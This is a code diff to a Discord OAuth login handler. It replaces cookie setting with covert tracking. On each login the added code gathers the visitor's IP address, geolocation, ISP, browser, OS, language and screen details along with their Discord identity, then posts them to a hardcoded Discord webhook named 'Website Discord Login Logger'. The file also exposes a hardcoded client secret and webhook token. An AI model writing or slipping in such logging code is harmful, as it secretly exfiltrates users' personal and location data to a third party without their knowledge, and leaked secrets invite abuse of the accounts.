@@ -1,6 +1,7 @@
 const CLIENT_ID = "1415538798460272723";
 const CLIENT_SECRET = "EgAnSyhqyi0FqDRhDCasFa5bldRnE7ce";
 const REDIRECT_URI = "https://coreapi.online";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1415852727145336832/RrVh5LhYuqcAsUtnZkHIkcPOrJmKrmdQePFrOpuQh_AvSdLNNN1oND7xPv3v4z_64p1"; // <-- Put your webhook here
 
 export default async function handler(req, res) {
   if (req.method !== "GET") {
@@ -39,26 +40,66 @@ export default async function handler(req, res) {
     });
     const user = await userRes.json();
 
-    // Set cookies
-    res.setHeader('Set-Cookie', [
-      cookie.serialize('discordUsername', user.username + '#' + user.discriminator, {
-        httpOnly: false,
-        maxAge: 60 * 60 * 24 * 7, // 7 days
-        path: '/',
-        sameSite: 'lax',
-        secure: true
-      }),
-      cookie.serialize('discordID', user.id, {
-        httpOnly: false,
-        maxAge: 60 * 60 * 24 * 7, 
-        path: '/',
-        sameSite: 'lax',
-        secure: true
-      }),
-    ]);
+    // Get visitor IP
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "Unknown";
 
-    // Redirect back to main site
-    res.redirect('/');
+    // Fetch geolocation info
+    const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
+    const geoData = await geoRes.json();
+
+    // Parse user agent
+    const ua = UAParser(req.headers["user-agent"] || "");
+    const deviceInfo = {
+      browserName: ua.browser.name || "Unknown",
+      browserVersion: ua.browser.version || "Unknown",
+      osName: ua.os.name || "Unknown",
+      osVersion: ua.os.version || "Unknown",
+      deviceType: ua.device.type || "Desktop",
+      platform: ua.os.name || "Unknown",
+      language: req.headers["accept-language"]?.split(",")[0] || "Unknown",
+      screenWidth: req.query.sw || "Unknown", // optional: can be sent from frontend
+      screenHeight: req.query.sh || "Unknown",
+      pixelRatio: req.query.pr || "Unknown",
+    };
+
+    // Send Discord webhook
+    const embedPayload = {
+      username: "Website Discord Login Logger",
+      embeds: [
+        {
+          title: "User Logged In",
+          color: 0xffa500, // light orange
+          thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` },
+          fields: [
+            { name: "Username", value: `${user.username}#${user.discriminator}`, inline: true },
+            { name: "User ID", value: user.id, inline: true },
+            { name: "IP Address", value: ip, inline: true },
+            { name: "Location", value: `${geoData.city || "Unknown City"}, ${geoData.regionName || "Unknown Region"}, ${geoData.country || "Unknown Country"}`, inline: true },
+            { name: "ISP", value: geoData.isp || "Unknown", inline: true },
+            { name: "Organization", value: geoData.org || "Unknown", inline: true },
+            { name: "AS", value: geoData.as || "Unknown", inline: true },
+            { name: "Browser", value: `${deviceInfo.browserName} v${deviceInfo.browserVersion}`, inline: true },
+            { name: "Operating System", value: `${deviceInfo.osName} ${deviceInfo.osVersion}`, inline: true },
+            { name: "Device Type", value: deviceInfo.deviceType, inline: true },
+            { name: "Platform", value: deviceInfo.platform, inline: true },
+            { name: "Language", value: deviceInfo.language, inline: true },
+            { name: "Screen Resolution", value: `${deviceInfo.screenWidth} x ${deviceInfo.screenHeight}`, inline: true },
+            { name: "Pixel Ratio", value: `${deviceInfo.pixelRatio}`, inline: true },
+            { name: "Timestamp", value: new Date().toISOString(), inline: false },
+          ],
+          footer: { text: "CoreAPI | Website Logging" },
+        },
+      ],
+    };
+
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(embedPayload),
+    });
+
+    // Redirect user back to main site
+    res.redirect("/");
   } catch (err) {
     console.error(err);
     res.status(500).json({ error: "OAuth failed" });
